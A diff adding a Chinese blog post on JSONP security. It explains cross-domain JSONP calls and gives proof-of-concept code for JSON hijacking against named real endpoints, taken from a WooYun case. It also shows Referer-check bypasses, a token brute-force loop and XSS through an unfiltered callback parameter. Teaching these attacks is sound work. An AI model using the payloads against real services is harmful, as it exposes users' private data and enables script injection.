@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"phyb0x.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="JSONPJSON with Paddig，JSONP基本语法如下： callback(&amp;#123; &quot;name&quot;: &quot;kwan&quot; , &quot;msg&quot;: &quot;获取成功&quot; &amp;#125;);  JSONP是基于JSON格式为解觉跨域问题而产生的解觉方案。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jsonp安全">
+<meta property="og:url" content="https://phyb0x.github.io/2019/01/14/jsonp%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="p&#39;Blog">
+<meta property="og:description" content="JSONPJSON with Paddig，JSONP基本语法如下： callback(&amp;#123; &quot;name&quot;: &quot;kwan&quot; , &quot;msg&quot;: &quot;获取成功&quot; &amp;#125;);  JSONP是基于JSON格式为解觉跨域问题而产生的解觉方案。">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.imgur.com/Lp5eodh.jpg">
+<meta property="article:published_time" content="2019-01-14T09:12:00.000Z">
+<meta property="article:modified_time" content="2019-01-19T02:06:02.000Z">
+<meta property="article:author" content="Yumi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/Lp5eodh.jpg">
+
+<link rel="canonical" href="https://phyb0x.github.io/2019/01/14/jsonp%E5%AE%89%E5%85%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>jsonp安全 | p'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">p'Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="https://phyb0x.github.io/2019/01/14/jsonp%E5%AE%89%E5%85%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/choumei.png">
+      <meta itemprop="name" content="Yumi">
+      <meta itemprop="description" content="Yumi">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="p'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          jsonp安全
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-01-14 17:12:00" itemprop="dateCreated datePublished" datetime="2019-01-14T17:12:00+08:00">2019-01-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-01-19 10:06:02" itemprop="dateModified" datetime="2019-01-19T10:06:02+08:00">2019-01-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSON with Paddig，JSONP基本语法如下：</p>
+<pre><code>callback(&#123; &quot;name&quot;: &quot;kwan&quot; , &quot;msg&quot;: &quot;获取成功&quot; &#125;);
+</code></pre>
+<p>JSONP是基于JSON格式为解觉跨域问题而产生的解觉方案。</p>
+<span id="more"></span>
+
+<h3 id="jsonp-跨域"><a href="#jsonp-跨域" class="headerlink" title="jsonp 跨域"></a>jsonp 跨域</h3><p>说起来也很难简单a.com b.com 假设a.com要访问b.com的json数据</p>
+<pre><code>&#123;&quot;id&quot; : &quot;1&quot;,&quot;name&quot; : &quot;phyb0x&quot;&#125;
+</code></pre>
+<p>b.com上要有一个callback输出点</p>
+<pre><code>&lt;?php
+//getUsers.php
+$callback = $_GET[&#39;callback&#39;];
+print $callback.&#39;(&#123;&quot;id&quot; : &quot;1&quot;,&quot;name&quot; : &quot;phyb0x&quot;&#125;);&#39;;
+?&gt;
+</code></pre>
+<p>然后a.com进行调用</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;http://mini.jiasule.com/framework/jquery/1.9.1/jquery-1.9.1.js&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+$.getJSON(&quot;http://www.b.com/getUsers.php?callback=?&quot;, function(getUsers)&#123;
+  alert(getUsers.name);
+&#125;);
+&lt;/script&gt;
+</code></pre>
+<p>会根据callback定义的函数功能返回json数据。</p>
+<p>说起来真的晦涩难懂，实际上这个流程就是b.com上本身就有一个jsonp格式传输的点，a.com利用callback传参的函数(可以是内置写好的函数也可以是a.com自定义的(用?表示，同上述例子))去返回相应的数据。</p>
+<p>一开始我以为跨域是漏洞的点，但是看了乌云案例发现跨域是jsonp的基本功能，漏洞点在于jsonp传输了一些敏感数据，而我们可以通过csrf+jsonp跨域获到这些敏感数据。</p>
+<h3 id="JSONP安全问题"><a href="#JSONP安全问题" class="headerlink" title="JSONP安全问题"></a>JSONP安全问题</h3><h4 id="json劫持"><a href="#json劫持" class="headerlink" title="json劫持"></a>json劫持</h4><p>当某网站使用JSONP传递敏感数据的时候，攻击者可以构造恶意JSONP调用界面，诱导被攻击者访问。</p>
+<p>引用wooyun-2013-019969</p>
+<pre><code>http://tinfo.qunar.com/ticket/passenger/passenger_info.jsp?&amp;type=passenger&amp;callback=qunarcallback
+</code></pre>
+<p>构造构造poc跨域获取敏感信息</p>
+<pre><code>&lt;script&gt;
+
+function qunarcallback(json)&#123;
+
+    alert(JSON.stringify(json))
+
+&#125;
+
+&lt;/script&gt;
+
+&lt;script src=&quot;http://tinfo.qunar.com/ticket/passenger/passenger_info.jsp?&amp;type=passenger&amp;callback=qunarcallback&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p><img src="https://i.imgur.com/Lp5eodh.jpg"></p>
+<p>有时也会对referer进行限制，可以尝试</p>
+<pre><code>http://www.qq.com.attack.com/attack.htm 
+http://www.attack.com/attack.htm?qq.com
+</code></pre>
+<p>或者利用<code>&lt;iframe&gt;</code> 调用 javscript 伪协议来实现空 Referer 调用 JSON 文件</p>
+<pre><code>&lt;iframe src=&quot;javascript:&#39;&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;/script&gt;&lt;script src=http://www.qq.com/login.php?calback=JSON&gt;&lt;/script&gt;&#39;&quot;&gt;&lt;/iframe&gt;
+</code></pre>
+<p>还有一种是增加token防御，不过也可以尝试暴力破解</p>
+<pre><code>function _Callback(o)&#123;
+alert(o.items[0].uin);
+&#125;
+for(i=17008;i&lt;17009;i++)&#123;  //暴力循环调用
+getJSON(&quot;http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=1111111&amp;g_tk=&quot;+i);
+&#125;
+</code></pre>
+<h4 id="Callback函数可定义"><a href="#Callback函数可定义" class="headerlink" title="Callback函数可定义"></a>Callback函数可定义</h4><pre><code>&lt;?php
+//getUsers.php
+$callback = $_GET[&#39;callback&#39;];
+print $callback.&#39;(&#123;&quot;id&quot; : &quot;1&quot;,&quot;name&quot; : &quot;phyb0x&quot;&#125;);&#39;;
+?&gt;
+</code></pre>
+<p>$callback没有进行任何过滤</p>
+<h5 id="Content-Type与XSS"><a href="#Content-Type与XSS" class="headerlink" title="Content-Type与XSS"></a>Content-Type与XSS</h5><p>Content-Type: application/json 传入</p>
+<pre><code>http://127.0.0.1/getUsers.php?callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;
+</code></pre>
+<p>构成xss，而application / javascript  而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。</p>
+<p>防御绕过姿势</p>
+<p>严格定义 Content-Type: application / json，这种方式会不解析恶意插入的 XSS 代码（直接访问提示文件下载），在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html。</p>
+<p>过滤 callback 以及 JSON 数据输出，常规防御手段，也粗在绕过可能。</p>
+<p>参考链接: </p>
+<p><a target="_blank" rel="noopener" href="http://blog.knownsec.com/2015/03/jsonp_security_technic/">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/12/29/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" rel="prev" title="横向移动">
+      <i class="fa fa-chevron-left"></i> 横向移动
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/01/17/weblogic%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B1%87%E6%80%BB/" rel="next" title="weblogic漏洞利用汇总">
+      weblogic漏洞利用汇总 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#JSONP"><span class="nav-number">1.</span> <span class="nav-text">JSONP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jsonp-%E8%B7%A8%E5%9F%9F"><span class="nav-number">2.</span> <span class="nav-text">jsonp 跨域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSONP%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">JSONP安全问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#json%E5%8A%AB%E6%8C%81"><span class="nav-number">3.1.</span> <span class="nav-text">json劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Callback%E5%87%BD%E6%95%B0%E5%8F%AF%E5%AE%9A%E4%B9%89"><span class="nav-number">3.2.</span> <span class="nav-text">Callback函数可定义</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Content-Type%E4%B8%8EXSS"><span class="nav-number">3.2.1.</span> <span class="nav-text">Content-Type与XSS</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Yumi"
+      src="/images/choumei.png">
+  <p class="site-author-name" itemprop="name">Yumi</p>
+  <div class="site-description" itemprop="description">Yumi</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yumi</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
